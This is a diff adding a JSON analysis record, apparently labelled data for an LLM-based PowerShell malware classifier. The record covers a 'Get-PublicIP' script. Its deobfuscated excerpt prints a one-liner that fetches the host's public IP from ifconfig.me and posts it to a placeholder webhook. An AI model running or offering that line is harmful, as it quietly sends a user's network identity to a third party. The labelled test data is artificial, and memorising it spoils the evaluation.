@@ -1,0 +1,61 @@
+{
+  "meta": {
+    "quelldatei": "tech_033_Get-PublicIP(not_encoded).ps1",
+    "sha256": "4c38a266ee9e53599a4ff6ca8bf59c35b74de55b2771edda93420c42d51f9610",
+    "groesse_bytes": 186,
+    "zeilen": 3,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "your webhook here",
+      "application/json"
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "your webhook here",
+      "application/json"
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "your webhook here",
+      "application/json"
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "# must pass it a $w variable with webhook. Add ;$w=\"your webhook here\" at the end\ncurl ifconfig.me|%{irm $w -Met Post -Bo (@{content=$_}|ConvertTo-Json) -ContentType 'application/json'}\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Web-Anfrage senden"
+    ]
+  }
+}
